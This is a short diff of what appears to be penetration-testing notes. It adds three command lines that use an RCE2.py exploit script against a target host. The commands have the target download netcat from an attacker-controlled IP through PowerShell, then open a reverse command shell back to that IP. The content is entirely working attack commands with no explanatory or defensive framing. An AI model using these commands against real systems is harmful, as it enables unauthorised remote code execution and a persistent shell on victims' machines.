@@ -1,15 +1,15 @@
 [[Editing Copy Page]]
 
 ```
-
+python3 RCE2.py --target-ip 192.168.107.199 -v --cmd 'powershell -c "curl http://192.168.45.190/nc64.exe -o C:/Windows/Temp/nc64.exe"'
 ```
 
 ```
-
+python3 RCE2.py --target-ip 192.168.107.199 -v --cmd 'powershell -c "C:/Windows/Temp/nc.exe -nv 192.168.45.190 135 -e cmd"'
 ```
 
 ```
-
+python3 RCE2.py --target-ip 192.168.107.199 -v --cmd "powershell wget http://192.168.45.190/nc.exe -OutFile C:\Windows\Temp\nc.exe"
 ```
 
 ```
